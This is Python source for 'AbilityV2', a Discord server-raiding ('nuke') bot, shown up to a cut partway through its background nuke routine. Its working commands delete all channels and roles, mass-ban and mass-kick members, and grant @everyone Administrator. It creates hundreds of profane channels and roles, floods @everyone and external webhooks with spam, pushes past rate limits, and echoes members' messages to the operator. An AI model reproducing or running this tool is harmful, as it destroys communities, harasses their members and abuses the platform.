"""
AbilityV2 - By a man with potential
Made by Baahwei
"""
import os
import sys
import json
import asyncio
import random
import time
import glob
from datetime import datetime
from threading import Thread

try:
    import discord
    from discord.ext import commands
    from colorama import Fore, Style, init as colorama_init
    import aiohttp
except ImportError:
    print("[*] Installing dependencies...")
    os.system(f"{sys.executable} -m pip install discord.py colorama aiohttp -q")
    import discord
    from discord.ext import commands
    from colorama import Fore, Style, init as colorama_init
    import aiohttp

colorama_init(autoreset=True)

# ============================================================
# PATHS
# ============================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIGS_DIR = os.path.join(BASE_DIR, "configs")


def ensure_configs_dir():
    if not os.path.isdir(CONFIGS_DIR):
        os.makedirs(CONFIGS_DIR, exist_ok=True)


def list_configs():
    ensure_configs_dir()
    files = glob.glob(os.path.join(CONFIGS_DIR, "*.json"))
    names = [os.path.splitext(os.path.basename(f))[0] for f in files]
    names.sort()
    return names


def load_config(name):
    path = os.path.join(CONFIGS_DIR, f"{name}.json")
    if not os.path.isfile(path):
        return None
    with open(path, "r") as f:
        return json.load(f)


def save_config(name, data):
    ensure_configs_dir()
    path = os.path.join(CONFIGS_DIR, f"{name}.json")
    keys = sorted(data.keys())
    ordered = {k: data[k] for k in keys}
    with open(path, "w") as f:
        json.dump(ordered, f, indent=4)
    return path


DEFAULT_CONFIG = {
    "bot": {
        "activity_text": "AbilityV2 | Baahwei",
        "prefix": "!",
        "status": "dnd",
        "token": "YOUR_BOT_TOKEN_HERE",
    },
    "nuke": {
        "channel_names": [
            "fucked-by-baahwei",
            "ability-on-top",
            "reversal-tuff",
            "owned",
        ],
        "channels_to_create": 250,
        "role_names": [
            "FUCKED-BY-BAAHWEI",
            "ABILITY-V2",
            "OWNED",
        ],
        "roles_to_create": 250,
        "server_description": "ABILITY V2 | REVERSAL TUFF",
        "server_icon_url": "https://cdn.discordapp.com/icons/1471322617800556810/65cd078387c25574b85791dc0bd17284.png?size=1024",
        "server_name": "FUCKED BY BAAHWEI",
        "spam_messages": [
            "@everyone FUCKED BY BAAHWEI | ABILITY V2 ON TOP",
            "@everyone REVERSAL TUFF | ABILITY V2 OWNS YOU",
            "@everyone BAAHWEI IS GOATED | ABILITY V2",
        ],
    },
    "spam": {
        "messages_per_second": 50,
    },
    "webhook_spammer": {
        "delay_seconds": 0.05,
        "enabled": False,
        "message": "@everyone FUCKED BY BAAHWEI | ABILITY V2",
        "username": "AbilityV2",
        "webhook_urls": [],
    },
}


# ============================================================
# BANNER - Pure ASCII, Purple to White gradient
# ============================================================
BANNER_ASCII = r"""
     _    ____ ___ _     ___ _____ __   __    ____  
    / \  | __ )_ _| |   |_ _|_   _|\ \ / /   |___ \ 
   / _ \ |  _ \| || |    | |  | |   \ V /     __) |
  / ___ \| |_) | || |___ | |  | |    | |     / __/ 
 /_/   \_\____/___|_____|___| |_|    |_|    |_____|
"""


def clear_console():
    os.system("cls" if os.name == "nt" else "clear")


def set_title():
    os.system("title AbilityV2 - Made by Baahwei")


def _ts():
    return datetime.now().strftime("%H:%M:%S")


_STATUS_COLORS = {
    "info": Fore.LIGHTWHITE_EX,
    "ok": Fore.LIGHTGREEN_EX,
    "err": Fore.LIGHTRED_EX,
    "warn": Fore.LIGHTYELLOW_EX,
    "cyan": Fore.LIGHTCYAN_EX,
    "magenta": Fore.MAGENTA,
    "purple": Fore.MAGENTA,
}


def log(msg, kind="info"):
    c = _STATUS_COLORS.get(kind, Fore.LIGHTWHITE_EX)
    print(f"{Fore.LIGHTBLACK_EX}[{_ts()}]{Fore.RESET} {c}{msg}{Fore.RESET}")


def print_banner():
    clear_console()
    set_title()
    lines = BANNER_ASCII.split("\n")
    total = len(lines)
    for i, line in enumerate(lines):
        t = i / max(total - 1, 1)
        r = int(128 + t * 127)
        g = int(0 + t * 220)
        b = int(128 + t * 127)
        print(f"\x1b[38;2;{r};{g};{b}m{line}\x1b[0m")
    print("")
    print(f"{Fore.LIGHTWHITE_EX}          MADE BY: Baahwei{Fore.RESET}")
    print("")


# ============================================================
# CONFIG SELECTION
# ============================================================
def select_config():
    """Show all configs alphabetically, let user pick or create new."""
    configs = list_configs()

    # Ensure default exists
    if "default" not in configs:
        save_config("default", DEFAULT_CONFIG)
        configs = list_configs()

    print_banner()
    print(f"{Fore.MAGENTA}  -- CONFIG SELECTION --{Fore.RESET}")
    print("")
    for idx, name in enumerate(configs, 1):
        marker = " (default)" if name == "default" else ""
        print(f"  {Fore.LIGHTCYAN_EX}[{idx}]{Fore.RESET} {name}{Fore.LIGHTBLACK_EX}{marker}{Fore.RESET}")

    print("")
    print(f"  {Fore.LIGHTWHITE_EX}Type a number to select, or type a NEW name to create a config.{Fore.RESET}")
    print("")

    while True:
        try:
            choice = input(f"  {Fore.MAGENTA}>{Fore.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n")
            sys.exit(0)

        if choice == "":
            continue

        # Check if number
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(configs):
                selected = configs[idx - 1]
                return selected, load_config(selected)
            else:
                log("Invalid number, try again.", "warn")
                continue

        # Treat as new config name
        name = choice
        # Remove .json if user typed it
        if name.endswith(".json"):
            name = name[:-5]
        name = name.strip()
        if not name:
            continue

        # Check if it already exists
        if name in configs:
            confirm = input(f"  Config '{name}' already exists. Load it? (y/n): ").strip().lower()
            if confirm in ("y", "yes"):
                return name, load_config(name)
            continue

        # Create new config by copying default
        new_cfg = json.loads(json.dumps(DEFAULT_CONFIG))
        save_config(name, new_cfg)
        log(f"Created new config: {name}.json", "ok")
        log("Edit it and restart to use it.", "info")
        input("\n  Press Enter to continue...")
        configs = list_configs()
        print_banner()
        print(f"{Fore.MAGENTA}  -- CONFIG SELECTION --{Fore.RESET}")
        print("")
        for idx2, n in enumerate(configs, 1):
            print(f"  {Fore.LIGHTCYAN_EX}[{idx2}]{Fore.RESET} {n}{Fore.RESET}")
        print("")


# ============================================================
# GLOBAL STATE (set after config chosen)
# ============================================================
CFG = None
CFG_NAME = None
BOT_TOKEN = None
BOT_PREFIX = None
BOT_STATUS = None
BOT_ACTIVITY = None
CHANNEL_NAMES = None
ROLE_NAMES = None
SPAM_MESSAGES = None
SERVER_NAME = None
SERVER_DESC = None
SERVER_ICON = None
CHANNELS_TO_CREATE = None
ROLES_TO_CREATE = None
MSG_PER_SEC = None
WH_ENABLED = None
WH_URLS = None
WH_MESSAGE = None
WH_DELAY = None
WH_USERNAME = None

_COLOR_CACHE = None


def apply_config(cfg):
    global CFG, BOT_TOKEN, BOT_PREFIX, BOT_STATUS, BOT_ACTIVITY
    global CHANNEL_NAMES, ROLE_NAMES, SPAM_MESSAGES, SERVER_NAME, SERVER_DESC, SERVER_ICON
    global CHANNELS_TO_CREATE, ROLES_TO_CREATE, MSG_PER_SEC
    global WH_ENABLED, WH_URLS, WH_MESSAGE, WH_DELAY, WH_USERNAME, _COLOR_CACHE

    CFG = cfg
    b = cfg["bot"]
    BOT_TOKEN = b["token"]
    BOT_PREFIX = b.get("prefix", "!")
    BOT_STATUS = b.get("status", "dnd")
    BOT_ACTIVITY = b.get("activity_text", "AbilityV2 | Baahwei")

    n = cfg["nuke"]
    CHANNEL_NAMES = n["channel_names"]
    ROLE_NAMES = n["role_names"]
    SPAM_MESSAGES = n["spam_messages"]
    SERVER_NAME = n["server_name"]
    SERVER_DESC = n["server_description"]
    SERVER_ICON = n["server_icon_url"]
    CHANNELS_TO_CREATE = n["channels_to_create"]
    ROLES_TO_CREATE = n["roles_to_create"]

    MSG_PER_SEC = cfg["spam"]["messages_per_second"]

    w = cfg["webhook_spammer"]
    WH_ENABLED = w["enabled"]
    WH_URLS = w["webhook_urls"]
    WH_MESSAGE = w["message"]
    WH_DELAY = w["delay_seconds"]
    WH_USERNAME = w["username"]

    _COLOR_CACHE = [discord.Color(random.randint(0x000000, 0xFFFFFF)) for _ in range(500)]


def rand_color():
    return random.choice(_COLOR_CACHE)


def cfg_reload():
    """Reload current config from disk."""
    if CFG_NAME:
        new = load_config(CFG_NAME)
        if new:
            apply_config(new)
            return True
    return False


# ============================================================
# HTTP SESSION
# ============================================================
_http_session = None


async def get_http():
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=0, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=10),
        )
    return _http_session


# ============================================================
# WEBHOOK SPAMMER (runs alongside bot)
# ============================================================
class WebhookSpammer:
    def __init__(self, urls, message, delay, username):
        self.urls = urls
        self.message = message
        self.delay = delay
        self.username = username
        self._running = False
        self._task = None
        self._sent = 0
        self._errors = 0
        self._start_ts = 0.0

    @property
    def running(self):
        return self._running

    async def _send_one(self, session, url):
        payload = {"content": self.message, "username": self.username}
        try:
            async with session.post(url, json=payload) as resp:
                if resp.status == 429:
                    retry = float(resp.headers.get("Retry-After", 1))
                    await asyncio.sleep(retry)
                    return await self._send_one(session, url)
                self._sent += 1
        except Exception:
            self._errors += 1

    async def _loop(self):
        session = await get_http()
        self._start_ts = time.time()
        self._running = True
        log(f"WEBHOOK SPAMMER ONLINE [{len(self.urls)} URLs | {self.delay}s delay]", "ok")
        while self._running:
            tasks = [self._send_one(session, u) for u in self.urls]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(self.delay if self.delay > 0 else 0.001)

    def start(self, loop):
        if self._running or not self.urls:
            return
        self._task = loop.create_task(self._loop())

    def stop(self):
        self._running = False
        elapsed = time.time() - self._start_ts if self._start_ts > 0 else 0
        log(f"Webhook spammer stopped | {self._sent} sent | {self._errors} errors | {elapsed:.1f}s", "info")
        if self._task:
            self._task.cancel()

    def stats_dict(self):
        elapsed = time.time() - self._start_ts if self._start_ts > 0 else 0
        return {
            "sent": self._sent,
            "errors": self._errors,
            "elapsed": elapsed,
            "rate": self._sent / elapsed if elapsed > 0 and self._sent > 0 else 0,
        }


wh_spammer = None

STATUS_MAP = {
    "online": discord.Status.online,
    "idle": discord.Status.idle,
    "dnd": discord.Status.dnd,
    "invisible": discord.Status.invisible,
}


# ============================================================
# BOT SETUP
# ============================================================
def make_bot():
    intents = discord.Intents.all()
    intents.presences = False
    return commands.Bot(
        command_prefix=BOT_PREFIX,
        intents=intents,
        help_command=None,
        case_insensitive=True,
        max_messages=None,
    )


bot = make_bot()


# ============================================================
# PARALLEL MASS OPERATIONS
# ============================================================
async def mass_exec(items, op, label, batch=30):
    total = len(items)
    if total == 0:
        return 0, 0
    ok = 0
    fail = 0
    if GOD_MODE:
        effective_batch = 50
    elif SAFE_MODE:
        effective_batch = 3
    else:
        effective_batch = batch
    safe_delay = 1.2 if SAFE_MODE else 0
    for i in range(0, total, effective_batch):
        chunk = items[i : i + effective_batch]
        results = await asyncio.gather(*[op(x) for x in chunk], return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                fail += 1
            else:
                ok += 1
        if SAFE_MODE and safe_delay > 0 and not GOD_MODE:
            await asyncio.sleep(safe_delay)
    if GOD_MODE:
        log(f"[GOD] {label}: {ok}/{total} done ({fail} failed)", "magenta")
    elif SAFE_MODE:
        log(f"[SAFE] {label}: {ok}/{total} done ({fail} failed)", "cyan")
    else:
        log(f"{label}: {ok}/{total} done ({fail} failed)", "ok")
    return ok, fail


async def _del(x):
    try:
        await x.delete()
    except Exception:
        pass


# ============================================================
# ON READY
# ============================================================
@bot.event
async def on_ready():
    global wh_spammer
    status_val = STATUS_MAP.get(BOT_STATUS, discord.Status.dnd)
    await bot.change_presence(
        status=status_val,
        activity=discord.Activity(type=discord.ActivityType.watching, name=BOT_ACTIVITY),
    )
    print_banner()
    log(f"Config      : {CFG_NAME}.json", "magenta")
    log(f"Prefix      : {BOT_PREFIX}", "magenta")
    log(f"Status      : {BOT_STATUS}", "cyan")
    log(f"Activity    : {BOT_ACTIVITY}", "cyan")
    log(f"Logged in   : {bot.user} (ID: {bot.user.id})", "cyan")
    log(f"Servers     : {len(bot.guilds)}", "cyan")
    log(f"Webhook Spam: {'ON' if WH_ENABLED else 'OFF'} | {len(WH_URLS)} URL(s)", "magenta")
    log(f"Spam Speed  : {MSG_PER_SEC} msg/s", "cyan")
    log("AbilityV2 is ONLINE - IDIOT MODE ACTIVE", "ok")
    print("")
    print(f"{Fore.LIGHTWHITE_EX}          MADE BY: Baahwei{Fore.RESET}")
    print("")

    # Initialize webhook spammer with current config
    wh_spammer = WebhookSpammer(WH_URLS, WH_MESSAGE, WH_DELAY, WH_USERNAME)

    if WH_ENABLED and WH_URLS:
        wh_spammer.start(bot.loop)

    # Show commands
    show_idiot_commands()

    # Start IDIOT MODE input loop
    bot.loop.create_task(idiot_mode_loop())


# ============================================================
# CHANNEL CREATE -> AUTO SPAM (speed from config)
# ============================================================
@bot.event
async def on_guild_channel_create(channel):
    if not isinstance(channel, discord.TextChannel):
        return
    try:
        wh = await channel.create_webhook(name="AbilityV2 | Baahwei")
    except Exception:
        wh = None

    msg = random.choice(SPAM_MESSAGES)
    delay = 1.0 / max(MSG_PER_SEC, 1)

    async def spam_forever():
        while True:
            try:
                await channel.send(msg)
                if wh:
                    await wh.send(msg, username="AbilityV2 | Baahwei")
            except Exception:
                pass
            await asyncio.sleep(delay)

    bot.loop.create_task(spam_forever())


# ============================================================
# BIRDS EYE VIEW - Live message monitor
# ============================================================
RECENT_MESSAGES = []
MAX_RECENT = 50
BIRDSEYE_MODE = False
_VIEW_GUILD = None


@bot.event
async def on_message(message):
    global RECENT_MESSAGES
    # Ignore own messages and webhook/spam messages
    if message.author == bot.user or message.webhook_id:
        return
    if not message.guild:
        return
    if BIRDSEYE_MODE and (_VIEW_GUILD is None or message.guild.id == _VIEW_GUILD.id):
        ts = message.created_at.strftime("%H:%M:%S")
        entry = f"[{ts}] {Fore.LIGHTCYAN_EX}{message.author.name}#{message.author.discriminator}{Fore.RESET} : {message.content}"
        RECENT_MESSAGES.append(entry)
        if len(RECENT_MESSAGES) > MAX_RECENT:
            RECENT_MESSAGES.pop(0)
        # Print in birdseye mode (clean panel)
        print(f"  {Fore.LIGHTBLACK_EX}[{ts}]{Fore.RESET} {Fore.LIGHTCYAN_EX}{message.author.name}{Fore.RESET}: {message.content[:100]}")
    # Process bot commands normally
    await bot.process_commands(message)


# ============================================================
# BACKGROUND NUKE TRACKING
# ============================================================
NUKE_RUNNING = False
NUKE_TASK = None
SAFE_MODE = False
GOD_MODE = False


# ============================================================
# CONSOLE MODE SWITCHING
# ============================================================
CURRENT_MODE = "idiot"


def show_mode_separator(mode_name, color=Fore.MAGENTA):
    print(f"{color}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTWHITE_EX}{mode_name}{Fore.RESET}")
    print(f"{color}  {'=' * 50}{Fore.RESET}")


def show_idiot_commands():
    print(f"{Fore.MAGENTA}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTWHITE_EX}IDIOT MODE - Type commands below{Fore.RESET}")
    print(f"{Fore.MAGENTA}  {'=' * 50}{Fore.RESET}")
    print("")
    print(f"  {Fore.LIGHTCYAN_EX}nuke [server_id]{Fore.RESET}       - Spam, delete channels, recreate, change icon")
    print(f"  {Fore.LIGHTCYAN_EX}quicknuke [server_id]{Fore.RESET}  - Delete channels + roles only (no recreate)")
    print(f"  {Fore.LIGHTCYAN_EX}delchannels [server_id]{Fore.RESET} - Delete all channels")
    print(f"  {Fore.LIGHTCYAN_EX}delroles [server_id]{Fore.RESET}    - Delete all roles")
    print(f"  {Fore.LIGHTCYAN_EX}massban [server_id]{Fore.RESET}     - Ban all members")
    print(f"  {Fore.LIGHTCYAN_EX}masskick [server_id]{Fore.RESET}    - Kick all members")
    print(f"  {Fore.LIGHTCYAN_EX}adminall [server_id]{Fore.RESET}    - Give @everyone Administrator")
    print(f"  {Fore.LIGHTCYAN_EX}spamwebhook{Fore.RESET}            - Start external webhook spammer")
    print(f"  {Fore.LIGHTCYAN_EX}stopwebhook{Fore.RESET}            - Stop external webhook spammer")
    print(f"  {Fore.LIGHTCYAN_EX}webhookstats{Fore.RESET}           - Show webhook spammer stats")
    print(f"  {Fore.LIGHTCYAN_EX}serverinfo [server_id]{Fore.RESET}  - Show server information")
    print(f"  {Fore.LIGHTCYAN_EX}reload{Fore.RESET}                 - Reload config from disk")
    print(f"  {Fore.LIGHTCYAN_EX}safemode{Fore.RESET}                 - Toggle safe mode (anti-ratelimit)")
    print(f"  {Fore.LIGHTCYAN_EX}godmode{Fore.RESET}                  - Toggle GOD MODE (max speed, batch 50)")
    print(f"  {Fore.LIGHTCYAN_EX}webhooknuke / wn{Fore.RESET}        - Nuke a webhook (asks for URL)")
    print(f"  {Fore.LIGHTCYAN_EX}stopnuke{Fore.RESET}                - Cancel a running background nuke")
    print(f"  {Fore.LIGHTCYAN_EX}birdseye / be{Fore.RESET}          - Switch to BIRDS EYE VIEW (live monitor)")
    print(f"  {Fore.LIGHTCYAN_EX}shutdown{Fore.RESET}               - Shut down the bot")
    print(f"  {Fore.LIGHTCYAN_EX}help{Fore.RESET}                   - Show this menu")
    print("")
    print(f"{Fore.MAGENTA}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Omit server_id to target the first available server.{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Type 'exit' to quit.{Fore.RESET}")
    print("")


async def idiot_mode_loop():
    """Loop that reads commands from console and executes them."""
    global NUKE_RUNNING, NUKE_TASK, SAFE_MODE, GOD_MODE
    await asyncio.sleep(1)  # Let on_ready finish printing

    def reader():
        try:
            return input(f"{Fore.MAGENTA}[AbilityV2]{Fore.RESET} {Fore.LIGHTWHITE_EX}>{Fore.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            return "exit"

    while not bot.is_closed():
        cmd_line = await bot.loop.run_in_executor(None, reader)
        if not cmd_line:
            continue

        parts = cmd_line.split(maxsplit=1)
        cmd_name = parts[0].lower()
        server_id = None

        if len(parts) > 1:
            arg = parts[1].strip()
            if arg.isdigit() and len(arg) >= 17:
                server_id = int(arg)
            else:
                server_id = arg

        if cmd_name == "exit":
            log("Shutting down...", "warn")
            if wh_spammer:
                wh_spammer.stop()
            await bot.close()
            break

        elif cmd_name == "help":
            show_idiot_commands()

        elif cmd_name == "reload":
            if cfg_reload():
                log("Config reloaded from disk.", "ok")
            else:
                log("Failed to reload config.", "err")

        elif cmd_name in ("nuke", "quicknuke"):
            if NUKE_RUNNING:
                log("A nuke is already running! Use 'stopnuke' to cancel it.", "warn")
            else:
                # Select guild first if needed
                guild = None
                if server_id:
                    g = bot.get_guild(int(server_id))
                    if g:
                        guild = g
                if guild is None:
                    guild = await select_guild()
                if guild is None:
                    continue
                log("A man with potential is cooking - running in background", "warn")
                log(f"Type 'stopnuke' to cancel, 'shutdown' to quit.", "info")
                await start_background_nuke(cmd_name, guild)

        elif cmd_name == "stopnuke":
            if NUKE_RUNNING and NUKE_TASK:
                NUKE_RUNNING = False
                NUKE_TASK.cancel()
                log("NUKE CANCELLED!", "err")
                NUKE_TASK = None
            else:
                log("No nuke is currently running.", "info")

        elif cmd_name in ("delchannels", "delroles", "massban", "masskick", "adminall", "serverinfo"):
            await execute_on_guild(cmd_name, server_id)

        elif cmd_name == "spamwebhook":
            if wh_spammer and not wh_spammer.running and WH_URLS:
                wh_spammer.start(bot.loop)
                log("Webhook spammer started.", "ok")
            elif not WH_URLS:
                log("No webhook URLs in config.", "warn")
            else:
                log("Webhook spammer already running.", "info")

        elif cmd_name == "stopwebhook":
            if wh_spammer and wh_spammer.running:
                wh_spammer.stop()
            else:
                log("Webhook spammer not running.", "info")

        elif cmd_name == "webhookstats":
            if wh_spammer:
                s = wh_spammer.stats_dict()
                log(f"Sent: {s['sent']} | Errors: {s['errors']} | Rate: {s['rate']:.1f}/s | Elapsed: {s['elapsed']:.1f}s", "cyan")
            else:
                log("Webhook spammer not initialized.", "info")

        elif cmd_name == "safemode":
            SAFE_MODE = not SAFE_MODE
            GOD_MODE = False
            mode = "ON" if SAFE_MODE else "OFF"
            log(f"SAFE MODE {mode} {'- Reduced speed, no ratelimits' if SAFE_MODE else '- Full speed'}", "cyan" if SAFE_MODE else "warn")

        elif cmd_name == "godmode":
            GOD_MODE = not GOD_MODE
            if GOD_MODE:
                SAFE_MODE = False
                log("GODMODE ON - Max speed, batch 50, no delays. RIP rate limits.", "magenta")
            else:
                log("GODMODE OFF", "warn")

        elif cmd_name == "webhooknuke" or cmd_name == "wn":
            await webhook_nuke()

        elif cmd_name == "birdseye" or cmd_name == "be":
            await switch_to_birdseye(server_id)

        elif cmd_name == "shutdown":
            log("Shutting down...", "warn")
            if wh_spammer:
                wh_spammer.stop()
            await bot.close()
            break

        else:
            log(f"Unknown command: {cmd_name}. Type 'help' for commands.", "warn")


def show_birdseye_commands():
    print(f"{Fore.CYAN}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTWHITE_EX}BIRDS EYE VIEW - Live Monitor{Fore.RESET}")
    print(f"{Fore.CYAN}  {'=' * 50}{Fore.RESET}")
    print("")
    print(f"  {Fore.LIGHTCYAN_EX}ban @user / ban user_id{Fore.RESET}  - Ban a specific user")
    print(f"  {Fore.LIGHTCYAN_EX}kick @user / kick user_id{Fore.RESET} - Kick a specific user")
    print(f"  {Fore.LIGHTCYAN_EX}recent{Fore.RESET}                  - Show last 10 messages")
    print(f"  {Fore.LIGHTCYAN_EX}info{Fore.RESET}                    - Show server info panel")
    print(f"  {Fore.LIGHTCYAN_EX}nuke / quicknuke / etc{Fore.RESET}   - All idiot mode commands work here too")
    print(f"  {Fore.LIGHTCYAN_EX}idiot{Fore.RESET}                   - Switch back to IDIOT MODE")
    print(f"  {Fore.LIGHTCYAN_EX}exit / shutdown{Fore.RESET}         - Shut down")
    print("")
    print(f"{Fore.CYAN}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Live messages appear below. Type commands anytime.{Fore.RESET}")
    print("")


def show_birdseye_panel(guild):
    """Show server info panel in birdseye mode."""
    print(f"\n{Fore.CYAN}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTWHITE_EX}[BIRDS EYE] {guild.name}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Owner: {guild.owner} | Members: {guild.member_count}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Channels: {len(guild.channels)} | Roles: {len(guild.roles)}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}ID: {guild.id}{Fore.RESET}")
    print(f"{Fore.CYAN}  {'=' * 50}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Messages flow below...{Fore.RESET}\n")


async def switch_to_birdseye(server_id=None):
    global BIRDSEYE_MODE, _VIEW_GUILD, CURRENT_MODE

    guild = None
    if server_id and str(server_id).isdigit() and len(str(server_id)) >= 17:
        g = bot.get_guild(int(server_id))
        if g:
            guild = g
    if guild is None and bot.guilds:
        guild = bot.guilds[0]

    if guild is None:
        log("Bot is not in any server.", "err")
        return

    _VIEW_GUILD = guild
    BIRDSEYE_MODE = True
    CURRENT_MODE = "birdseye"

    clear_console()
    set_title()
    show_birdseye_panel(guild)
    show_birdseye_commands()
    log(f"BIRDS EYE VIEW active on {guild.name}", "cyan")

    # Run birdseye loop
    await birdseye_loop()


async def birdseye_loop():
    global BIRDSEYE_MODE, CURRENT_MODE, RECENT_MESSAGES, _VIEW_GUILD

    def reader():
        try:
            return input(f"{Fore.CYAN}[Birdseye]{Fore.RESET} {Fore.LIGHTWHITE_EX}>{Fore.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            return "exit"

    while not bot.is_closed() and BIRDSEYE_MODE:
        cmd_line = await bot.loop.run_in_executor(None, reader)
        if not cmd_line:
            continue

        parts = cmd_line.split(maxsplit=1)
        cmd_name = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd_name == "exit":
            log("Shutting down...", "warn")
            BIRDSEYE_MODE = False
            if wh_spammer:
                wh_spammer.stop()
            await bot.close()
            break

        elif cmd_name == "idiot" or cmd_name == "im":
            BIRDSEYE_MODE = False
            CURRENT_MODE = "idiot"
            clear_console()
            set_title()
            print_banner()
            log("Switched back to IDIOT MODE", "ok")
            show_idiot_commands()
            bot.loop.create_task(idiot_mode_loop())
            return

        elif cmd_name == "help":
            show_birdseye_commands()

        elif cmd_name == "recent":
            if RECENT_MESSAGES:
                print(f"\n{Fore.CYAN}  -- Last {min(10, len(RECENT_MESSAGES))} Messages --{Fore.RESET}")
                for m in RECENT_MESSAGES[-10:]:
                    print(f"  {m}")
                print("")
            else:
                log("No messages recorded yet.", "info")

        elif cmd_name == "info":
            show_birdseye_panel(_VIEW_GUILD)

        elif cmd_name == "ban" and arg:
            await birdseye_ban_kick(arg, "ban")

        elif cmd_name == "kick" and arg:
            await birdseye_ban_kick(arg, "kick")

        elif cmd_name in ("nuke", "quicknuke", "delchannels", "delroles", "massban", "masskick", "adminall", "serverinfo"):
            BIRDSEYE_MODE = False  # temporarily disable to avoid message spam in console
            await execute_on_guild(cmd_name, server_id=int(arg) if arg.isdigit() and len(arg) >= 17 else None)
            BIRDSEYE_MODE = True
            log("BIRDS EYE VIEW resuming...", "cyan")

        elif cmd_name == "shutdown":
            log("Shutting down...", "warn")
            BIRDSEYE_MODE = False
            if wh_spammer:
                wh_spammer.stop()
            await bot.close()
            break

        elif cmd_name == "spamwebhook":
            if wh_spammer and not wh_spammer.running and WH_URLS:
                wh_spammer.start(bot.loop)
                log("Webhook spammer started.", "ok")
            elif not WH_URLS:
                log("No webhook URLs in config.", "warn")
            else:
                log("Webhook spammer already running.", "info")

        elif cmd_name == "stopwebhook":
            if wh_spammer and wh_spammer.running:
                wh_spammer.stop()
            else:
                log("Webhook spammer not running.", "info")

        elif cmd_name == "webhookstats":
            if wh_spammer:
                s = wh_spammer.stats_dict()
                log(f"Sent: {s['sent']} | Errors: {s['errors']} | Rate: {s['rate']:.1f}/s | Elapsed: {s['elapsed']:.1f}s", "cyan")

        elif cmd_name == "reload":
            if cfg_reload():
                log("Config reloaded.", "ok")

        else:
            log(f"Unknown command: {cmd_name}. Type 'help'.", "warn")


async def birdseye_ban_kick(target_str, action):
    """Ban or kick a specific user from console."""
    guild = _VIEW_GUILD
    if guild is None:
        log("No active server.", "err")
        return

    target_str = target_str.strip()
    member = None

    # Try by ID
    if target_str.isdigit() and len(target_str) >= 17:
        member = guild.get_member(int(target_str))

    # Try by name (supports @mention)
    if member is None:
        clean = target_str.lstrip("@")
        for m in guild.members:
            if (
                m.name.lower() == clean.lower()
                or str(m).lower() == clean.lower()
                or f"{m.name}#{m.discriminator}".lower() == clean.lower()
            ):
                member = m
                break

    if member is None:
        log(f"User not found: {target_str}", "err")
        return

    if member == guild.owner:
        log("Cannot ban/kick the server owner.", "err")
        return

    if member.top_role >= guild.me.top_role:
        log(f"Cannot {action} {member.name} (higher role).", "err")
        return

    try:
        if action == "ban":
            await member.ban(reason="AbilityV2 | Baahwei")
        else:
            await member.kick(reason="AbilityV2 | Baahwei")
        log(f"{action.upper()}ED: {member.name}#{member.discriminator}", "ok")
    except Exception as e:
        log(f"Failed to {action}: {e}", "err")


async def select_guild():
    """Show server list and let user pick one."""
    guilds = list(bot.guilds)
    if len(guilds) == 0:
        log("Bot is not in any server.", "err")
        return None
    if len(guilds) == 1:
        return guilds[0]

    print(f"\n{Fore.MAGENTA}  -- Select Server --{Fore.RESET}")
    for idx, g in enumerate(guilds, 1):
        print(f"  {Fore.LIGHTCYAN_EX}[{idx}]{Fore.RESET} {g.name} {Fore.LIGHTBLACK_EX}({g.id} | {g.member_count} members){Fore.RESET}")

    while True:
        try:
            choice = input(f"\n  {Fore.MAGENTA}> {Fore.RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            return None
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(guilds):
                return guilds[idx - 1]
        log("Invalid choice, try again.", "warn")


async def start_background_nuke(cmd_name, guild):
    """Run nuke/quicknuke as a background task with rate limit display."""
    global NUKE_RUNNING, NUKE_TASK

    async def _nuke_task():
        global NUKE_RUNNING
        NUKE_RUNNING = True
        try:
            t0 = time.time()
            if cmd_name == "nuke":
                log(f"BG NUKE STARTED on {guild.name} ({guild.id})", "warn")
                log("Deleting channels...", "cyan")
                await mass_exec(list(guild.channels), _del, "Channels")
                log("Deleting roles...", "cyan")
                roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
                await mass_exec(roles, _del, "Roles")
                log("Editing server...", "cyan")
                try:
                    await guild.edit(name=SERVER_NAME, description=SERVER_DESC)
                except Exception:
                    pass
                try:
                    if SERVER_ICON:
                        async with aiohttp.ClientSession() as sess:
                            async with sess.get(SERVER_ICON) as resp:
                                if resp.status == 200:
                                    await guild.edit(icon=await resp.read())
                                    log("Server icon changed.", "ok")
                except Exception as e:
                    log(f"Could not change icon: {e}", "err")
                log(f"Creating {CHANNELS_TO_CREATE} channels...", "cyan")
                chan_tasks = [guild.create_text_channel(name=random.choice(CHANNEL_NAMES)) for _ in range(CHANNELS_TO_CREATE)]
                await asyncio.gather(*chan_tasks, return_exceptions=True)
                log(f"Creating {ROLES_TO_CREATE} roles...", "cyan")
                role_tasks = [guild.create_role(name=random.choice(ROLE_NAMES), color=rand_color()) for _ in range(ROLES_TO_CREATE)]
                await asyncio.gather(*role_tasks, return_exceptions=True)
            elif cmd_name == "quicknuke":
                log(f"BG QUICKNUKE on {guild.name}", "warn")
                await mass_exec(list(guild.channels), _del, "Channels")
                roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
                await mass_exec(roles, _del, "Roles")

            elapsed = time.time() - t0
